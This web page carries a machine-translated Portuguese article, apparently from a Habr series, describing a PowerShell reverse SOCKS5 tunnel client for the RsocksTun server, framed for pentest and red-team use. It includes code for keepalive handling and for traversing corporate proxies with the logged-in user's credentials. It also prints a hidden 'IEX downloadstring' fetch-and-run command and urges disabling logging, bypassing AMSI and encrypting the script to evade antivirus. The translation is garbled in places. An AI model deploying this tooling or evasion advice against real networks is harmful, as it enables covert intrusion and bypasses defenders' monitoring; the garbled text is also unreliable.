<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üï∫üèΩ üßëüèø‚Äçü§ù‚ÄçüßëüèΩ üêî Escrevemos o proxy Reverse socks5 no PowerShell. üÜî üéΩ ‚ò∏Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A hist√≥ria da pesquisa e desenvolvimento em 3 partes. A parte 3 √© pr√°tica. 
 Existem muitas faias - ainda mais benef√≠cios 

 Artigos anteriores do cic...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Escrevemos o proxy Reverse socks5 no PowerShell.</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/454254/">  A hist√≥ria da pesquisa e desenvolvimento em 3 partes.  A parte 3 √© pr√°tica. <br>  Existem muitas faias - ainda mais benef√≠cios <br><br>  Artigos anteriores do ciclo podem ser encontrados <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> =) <br><br><h3>  Verifica√ß√£o de batalha </h3><br>  Vamos agora testar a opera√ß√£o do nosso script na pr√°tica.  Para fazer isso, tente lan√ßar o t√∫nel reverso da m√°quina virtual (Windows 7 .net 4.7) para o VPS do Linux no Digital Ocean e, usando-o, voltaremos ao Win7.  Nesse caso, simulamos uma situa√ß√£o em que o Windows 7 √© a m√°quina do Cliente, o Linux VPS √© o nosso servidor. <br><a name="habracut"></a><br>  No VPS (no nosso caso, Ubuntu 18.04), instalamos e configuramos a parte do servidor do RsocksTun: <br><br><ul><li>  definir o golang: apt install golang </li><li>  pegue as fontes do rsockstun do gita: <br>  git clone <a href="">github.com/mis-team/rsockstun.git</a> / opt / rstun </li><li>  instalar depend√™ncias: <br>  acesse github.com/hashicorp/yamux <br>  acesse github.com/armon/go-socks5 <br>  acesse github.com/ThomsonReutersEikon/go-ntlm/ntlm </li><li>  compile de acordo com o manual: cd / opt / rstun;  vai construir </li><li>  gere certificado SSL: <br>  openssl req -novo -x509 -keyout server.key -out server.crt -days 365 -nodes </li><li>  come√ßamos a parte do servidor: </li></ul><br><img src="https://habrastorage.org/webt/c6/rx/45/c6rx45gxq1qcabdtdvdczplgq8m.png"><br><br><ul><li>  Iniciamos nosso script no cliente, indicando para ele o servidor para conectar, a porta e a senha: </li></ul><br><img src="https://habrastorage.org/webt/f2/hz/ks/f2hzksob9ctx8qsvrt-p1ycg0fe.png"><br><br><ul><li>  use a porta elevada do servidor Socks5 para ir para mail.ru </li></ul><br><img src="https://habrastorage.org/webt/fi/ye/lj/fiyeljrteulwjd0xfihggiovhsk.png"><br><br>  Como voc√™ pode ver nas capturas de tela, nosso script funciona.  Ficamos contentes, erguemos mentalmente um monumento para n√≥s mesmos e decidimos que tudo estava perfeito.  Mas ... <br><br><h3>  Tratamento de erros </h3><br>  Mas nem tudo √© t√£o bom quanto gostar√≠amos ... <br><br>  Durante a opera√ß√£o do script, um momento desagrad√°vel foi descoberto: se o script funciona atrav√©s de uma conex√£o n√£o muito r√°pida com o servidor, o erro mostrado na figura abaixo pode ocorrer ao transferir grandes dados <br><br><img src="https://habrastorage.org/webt/kb/sd/bn/kbsdbnzfegxlymwrz8bcygd7qeo.png"><br><br>  Depois de estudar esse erro, vemos que, quando recebemos uma mensagem de keepalive (enquanto os dados ainda est√£o sendo transmitidos para o servidor), tentamos escrever simultaneamente uma resposta para keepalive no soquete, o que causa um erro. <br><br>  Para corrigir a situa√ß√£o, precisamos esperar at√© que a transfer√™ncia de dados seja conclu√≠da e enviar uma resposta para o keepalive.  Mas aqui pode surgir outro problema: se uma mensagem keepalive chegar no momento entre o envio de um cabe√ßalho de 12 bytes e o envio de dados, destruiremos a estrutura do pacote ymx.  Portanto, uma solu√ß√£o mais correta seria transferir toda a funcionalidade para enviar dados dentro do yamuxScript, que processa eventos para enviar sequencialmente e n√£o haver√° tais situa√ß√µes. <br><br>  Ao mesmo tempo, para instruir o yamuxScript a enviar respostas de manuten√ß√£o de atividade, podemos usar nosso ArrayList StopFlag [0] compartilhado - o √≠ndice zero n√£o √© usado, porque  a numera√ß√£o dos fluxos do yamux come√ßa com 1. Nesse √≠ndice, transmitiremos no yamuxScript o valor de ping recebido na mensagem keepalive.  Por padr√£o, o valor ser√° -1, o que significa que nenhuma transmiss√£o √© necess√°ria.  O YamuxScript verificar√° esse valor e, se for 0 (o primeiro ping do keepalive = 0) ou mais, envie o valor passado para a resposta do keepalive: <br><br><pre><code class="plaintext hljs">if ($StopFlag[0] -ge 0){ #got yamux keepalive. we have to reply $outbuf = [byte[]](0x00,0x02,0x00,0x02,0x00,0x00,0x00,0x00) + [bitconverter]::getbytes([int32]$StopFlag[0])[3..0] $state.tcpstream.Write($outbuf,0,12) $state.tcpstream.flush() $StopFlag[0] = -1 }</code> </pre> <br>  Tamb√©m devemos excluir o envio no thread principal do programa de uma resposta ao sinalizador YMX SYN. <br><br>  Para fazer isso, tamb√©m devemos transferir essa funcionalidade dentro do yamuxScript, mas como o servidor yamux n√£o exige o envio de uma resposta ao YMX SYN e come√ßa a enviar dados imediatamente, simplesmente desativamos o envio deste pacote e √© isso: <br><br><pre> <code class="plaintext hljs">#$outbuf = [byte[]](0x00,0x01,0x00,0x02,$ymxstream[3],$ymxstream[2],$ymxstream[1],$ymxstream[0],0x00,0x00,0x00,0x00) #$tcpstream.Write($outbuf,0,12)</code> </pre> <br>  Depois disso, a transfer√™ncia de grandes quantidades de dados funciona bem. <br><br><h3>  Suporte de proxy </h3><br>  Agora vamos pensar em como podemos fazer com que nosso cliente trabalhe atrav√©s de um servidor proxy. <br><br>  Vamos come√ßar com o b√°sico.  Em teoria, o proxy http (ou seja, os proxies http funcionam na maioria das redes corporativas) foi projetado para funcionar com o protocolo HTTP e parece que o http n√£o tem o mesmo cheiro que o nosso.  Mas na natureza, al√©m do http, tamb√©m h√° https e seu navegador pode se conectar perfeitamente a sites https por meio de http normal - certo? <br><br>  A raz√£o para isso √© o modo de opera√ß√£o especial do servidor proxy - modo CONNECT.  Portanto, se o navegador quiser se conectar ao servidor do gmail via https por meio de um servidor proxy, ele enviar√° uma solicita√ß√£o CONNECT ao servidor proxy, que indica o host e a porta de destino. <br><br><pre> <code class="plaintext hljs">CONNECT gmail.com:443 HTTP/1.1 Host: gmail.com:443 Proxy-Connection: Keep-Alive</code> </pre> <br>  Ap√≥s uma conex√£o bem-sucedida ao servidor do gmail, o proxy retorna uma resposta 200 OK. <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK</code> </pre> <br>  Depois disso, todos os dados do navegador s√£o transmitidos diretamente para o servidor e vice-versa.  Em termos simples, um proxy conecta diretamente dois soquetes de rede entre si - um soquete de navegador e um soquete de servidor do Gmail.  Depois disso, o navegador come√ßa a estabelecer uma conex√£o SSL com o servidor do Gmail e trabalha diretamente com ele. <br><br>  Transferindo o exposto para o cliente, primeiro precisamos estabelecer uma conex√£o com o servidor proxy, enviar um pacote http indicando o m√©todo CONNECT e o endere√ßo do servidor yamux, aguardar uma resposta com o c√≥digo 200 e prosseguir para estabelecer uma conex√£o SSL. <br><br>  Em princ√≠pio, n√£o h√° nada particularmente complicado.  √â assim que o mecanismo de conex√£o atrav√©s do servidor proxy √© implementado no cliente golang rsockstun. <br><br>  As principais dificuldades come√ßam quando o servidor proxy requer autoriza√ß√£o ntlm ou kerberos ao se conectar a si mesmo. <br><br>  Nesse caso, o servidor proxy retorna o c√≥digo 407 e o cabe√ßalho http ntlm como uma sequ√™ncia base64 <br><br><pre> <code class="plaintext hljs">HTTP/1.1 407 Proxy Authentication Required Proxy-Authenticate: NTLM TlRMTVNTUAACAAAAAAAAADgAAABVgphianXk2614u2AAAAAAAAAAAKIAogA4AAAABQEoCgAAAA8CAA4AUgBFAFUAVABFAFIAUwABABwAVQBLAEIAUAAtAEMAQgBUAFIATQBGAEUAMAA2AAQAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQAAwA0AHUAawBiAHAALQBjAGIAdAByAG0AZgBlADAANgAuAFIAZQB1AHQAZQByAHMALgBuAGUAdAAFABYAUgBlAHUAdABlAHIAcwAuAG4AZQB0AAAAAAA= Date: Tue, 28 May 2019 14:06:15 GMT Content-Length: 0</code> </pre> <br>  Para obter uma autoriza√ß√£o bem-sucedida, precisamos decodificar essa linha e remover par√¢metros dela (como ntlm-challenge, nome de dom√≠nio).  Em seguida, usando esses dados, assim como o nome de usu√°rio e seu hash ntlm, devemos gerar uma resposta ntlm, codific√°-los de volta para base64 e envi√°-los de volta ao servidor proxy. <br><br><pre> <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> + UpsHCJmpIGttOj1VN + 5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA == <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> </pre> <br>  Mas isso n√£o √© t√£o ruim.  O fato √© que, quando executamos o script, n√£o sabemos o nome do usu√°rio atual nem o hash da senha ntlm.  Portanto, para autoriza√ß√£o no servidor proxy, precisamos descobrir o nome de usu√°rio / senha de outro lugar. <br><br>  Teoricamente, podemos implementar essa funcionalidade em um script (come√ßando com a configura√ß√£o manual dos par√¢metros de autentica√ß√£o, como feito no cliente GoLang, e terminando com o uso de um despejo de mem√≥ria do processo LSASS, como feito em mimikatz), mas nosso script crescer√° para tamanho e complexidade incr√≠veis, especialmente que esses t√≥picos est√£o al√©m do escopo deste artigo. <br><br>  Pensamos e decidimos que ir√≠amos para o outro lado ... <br><br>  Em vez de autorizar manualmente, usaremos a funcionalidade interna para trabalhar com um servidor proxy da classe HTTPWebRequest.  Mas nesse caso, teremos que alterar o c√≥digo do nosso servidor RsocksTun - afinal, quando recebe uma solicita√ß√£o do cliente, espera apenas uma string com uma senha e recebe uma solicita√ß√£o HTTP completa.  Em princ√≠pio, modificar o lado do servidor do rsoskstun n√£o √© t√£o dif√≠cil.  √â necess√°rio apenas decidir em qual parte da solicita√ß√£o http transmitiremos a senha (por exemplo, ser√° o cabe√ßalho http XAuth) e implementar a funcionalidade de processar a solicita√ß√£o http, verificar nosso cabe√ßalho com uma senha e enviar uma resposta http de retorno (200 OK).  Adicionamos essa funcionalidade a uma ramifica√ß√£o separada do projeto RSocksTun. <br><br>  Ap√≥s modificar a parte Golang do RSocksTun (servidor e cliente), come√ßaremos a adicionar a funcionalidade de trabalhar com um servidor proxy ao nosso script.  O c√≥digo mais simples da classe HttpWebRequest para conectar-se a um servidor da web por meio de um proxy √© semelhante a este: <br><br><pre> <code class="plaintext hljs">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $request = [System.Net.HttpWebRequest]::Create("https://gmail.com:443") $request.Method = "GET" $request.Headers.Add("Xauth","password") $proxy = new-object system.net.webproxy('http://127.0.0.1:8080'); $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials $request.Proxy = $proxy try {$serverResponse = $request.GetResponse()} catch {write-host "Can not connect"; exit}</code> </pre> <br>  Nesse caso, criamos uma inst√¢ncia da classe HttpWebRequest, configuramos as propriedades Proxy e credenciais e adicionamos o cabe√ßalho http XAuth personalizado.  Assim, nossa solicita√ß√£o aos servidores do Google passar√° pelo servidor proxy 127.0.0.1:8080.  Se o proxy solicitar autoriza√ß√£o, o pr√≥prio Windows "coletar√°" os cr√©ditos do usu√°rio atual e inserir√° os cabe√ßalhos http correspondentes. <br><br>  Em vez de especificar um servidor proxy manualmente, podemos usar as configura√ß√µes do sistema do servidor proxy: <br><br><pre> <code class="plaintext hljs">$proxy = [System.Net.WebRequest]::GetSystemWebProxy()</code> </pre> <br>  Portanto, depois que nos conectamos por meio de um servidor proxy ao servidor rsockstun e recebemos uma resposta HTTP com o c√≥digo 200, precisamos fazer um pequeno truque, a saber, da classe HTTPWebRequest, obter um objeto de fluxo para leitura / grava√ß√£o como $ tcpConnection.getStream ()  Fazemos isso atrav√©s do mecanismo de inspe√ß√£o de reflex√£o .Net (para aqueles que desejam entender esse mecanismo com mais detalhes, compartilhe o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">link</a> ).  Isso nos permite acessar os m√©todos e propriedades das classes subjacentes: <br><br><pre> <code class="plaintext hljs">#--------------------------------------------------------------------------------- # Reflection inspection to retrieve and reuse the underlying networkStream instance $responseStream = $serverResponse.GetResponseStream() $BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance" $rsType = $responseStream.GetType() $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags) $connection = $connectionProperty.GetValue($responseStream, $null) $connectionType = $connection.GetType() $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags) $tcpStream = $networkStreamProperty.GetValue($connection, $null)</code> </pre> <br>  Assim, obtivemos o mesmo fluxo de soquete, que √© conectado pelo servidor proxy ao servidor yamux e com o qual podemos executar opera√ß√µes de leitura / grava√ß√£o. <br><br>  Outro ponto que precisamos considerar √© o mecanismo para monitorar o estado da conex√£o.  Como trabalhamos com o servidor proxy e a classe HTTPWebRequest, n√£o temos a propriedade $ tcpConnection.Connected e precisamos monitorar o status da conex√£o de alguma forma.  Podemos fazer isso atrav√©s de um sinalizador $ conectado separado, ele √© definido como $ true ap√≥s receber o c√≥digo 200 do servidor proxy e √© redefinido para $ false quando ocorre uma exce√ß√£o durante a leitura do socket-stream: <br><br><pre> <code class="plaintext hljs">try { $num = $tcpStream.Read($tmpbuffer,0,12) } catch {$connected=$false; break;} if ($num -eq 0 ) {$connected=$false; break;}</code> </pre> <br>  Caso contr√°rio, nosso c√≥digo permanecer√° inalterado. <br><br><h3>  Lan√ßamento em linha </h3><br>  Como regra, todas as pessoas s√£s executam scripts semelhantes a partir dos arquivos PS1, mas √†s vezes (e quase sempre) no processo de pentest / redtime, √© necess√°rio executar m√≥dulos a partir da linha de comando sem gravar nada no disco, para n√£o deixar vest√≠gios .  Al√©m disso, o powershell permite fazer isso atrav√©s da linha de comando: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìc &lt;powershell code&gt; powershell.exe ‚Äìe &lt;base64 powershell code&gt;</code> </pre> <br>  No entanto, n√£o se deve realmente relaxar em rela√ß√£o ao sigilo de iniciar e executar comandos.  Como, em primeiro lugar, todo o c√≥digo do powershell √© registrado usando ferramentas padr√£o do Windows nos logs de eventos correspondentes (Windows PowerShell e Microsoft-Windows-PowerShell / Operacional) e, em segundo lugar, todo o c√≥digo executado no powershell passa pelo mecanismo AMSI ( Interface de verifica√ß√£o anti-malware).  Outra coisa √© que esses dois mecanismos s√£o perfeitamente caros com a√ß√µes simples.  Desativar revistas e ignorar a AMSI √© um t√≥pico separado para discuss√£o e escreveremos sobre isso em artigos futuros ou em nosso canal.  Mas agora um pouco sobre outra coisa. <br><br>  O fato √© que nosso script cresceu para tamanhos bastante impressionantes e √© claro que ele n√£o cabe em nenhuma linha de comando (o limite de cmd no Windows √© de 8191 caracteres).  Portanto, precisamos criar uma maneira de executar nosso script sem grav√°-lo no disco.  E aqui os m√©todos padr√£o usados ‚Äã‚Äãpelo malware nos ajudam h√° quase 15 anos.  Em suma, a regra √© simples - baixe e execute.  O principal √© n√£o confundir =) <br>  O comando de download e inicializa√ß√£o √© semelhante a este: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìw hidden -c "IEX ((new-object net.webclient).downloadstring('http://url.com/script.ps1'))"</code> </pre> <br>  Voc√™ pode encontrar ainda mais op√ß√µes de inicializa√ß√£o embutida no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">git</a> do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">HarmJ0y</a> 'I: <br><br>  Obviamente, antes de fazer o download, voc√™ precisa desativar os logs e ignorar ou desativar o AMSI.  O script em si deve ser criptografado antes do download, porque  durante o processo de download, ele ser√° verificado por seu antiv√≠rus (ou n√£o = =)) e, antes de iniciar, ser√° descriptografado de acordo.  Como fazer isso - voc√™, o leitor j√° deve inventar voc√™ mesmo.  Isso est√° al√©m do escopo deste t√≥pico.  Mas conhecemos um especialista legal nesse assunto - o todo-poderoso Google.  Existem muitos exemplos de criptografia e descriptografia na rede, al√©m de exemplos de desvio do AMSI. <br><br><h3>  Conclus√£o para todas as partes </h3><br>  No processo, apresentamos ao leitor a tecnologia dos ‚Äút√∫neis reversos‚Äù e seu uso para pentests, mostramos v√°rios exemplos desses t√∫neis e falamos sobre os pr√≥s e os contras de seu uso. <br><br>  Tamb√©m conseguimos criar um cliente powershell para o servidor RsocksTun com a capacidade: <br><br><ul><li>  Conex√µes SSL </li><li>  autoriza√ß√£o no servidor; </li><li>  trabalhe com o yamux-server com suporte para pings keepalive; </li><li>  modo de opera√ß√£o multithread; </li><li>  suporte ao trabalho atrav√©s de um servidor proxy com autoriza√ß√£o. </li></ul><br>  Voc√™ pode encontrar todo o c√≥digo rsockstun (golang e powershell) no ramo correspondente <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">em nosso github.</a>  A ramifica√ß√£o principal foi projetada para funcionar sem um servidor proxy, e a ramifica√ß√£o via_proxy foi projetada para funcionar atrav√©s de proxies e HTTP. <br><br>  Teremos o maior prazer em ouvir seus coment√°rios e sugest√µes sobre como melhorar o c√≥digo e a aplicabilidade do desenvolvimento na pr√°tica. <br><br>  Isso completa o ciclo de nossos artigos de tunelamento reverso.  Realmente esperamos que voc√™ esteja interessado em ler-nos e que as informa√ß√µes sejam √∫teis. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt454254/">https://habr.com/ru/post/pt454254/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt454240/index.html">An√°lise wavelet. Parte 3</a></li>
<li><a href="../pt454242/index.html">"Olha, que jetpack eu tenho!" "Ah, olha que foguete eu tenho!" (notas do campeonato de foguetes)</a></li>
<li><a href="../pt454246/index.html">Variedades de coordenadas usadas na GUI do Unity3d</a></li>
<li><a href="../pt454248/index.html">Servos na era da intelig√™ncia artificial</a></li>
<li><a href="../pt454252/index.html">Mesmo os recursos da Web de organiza√ß√µes conhecidas n√£o est√£o protegidos dos erros das crian√ßas.</a></li>
<li><a href="../pt454256/index.html">O que h√° de errado com nossa TI</a></li>
<li><a href="../pt454260/index.html">Dia das Crian√ßas com C√≥digo Ruim</a></li>
<li><a href="../pt454262/index.html">Por que todo cientista de dados deve conhecer o Dask</a></li>
<li><a href="../pt454264/index.html">4 canais sens√≠veis do Youtube sobre entrevistas t√©cnicas</a></li>
<li><a href="../pt454266/index.html">Dell e Alienware na Computex 2019: fale sobre as principais inova√ß√µes</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>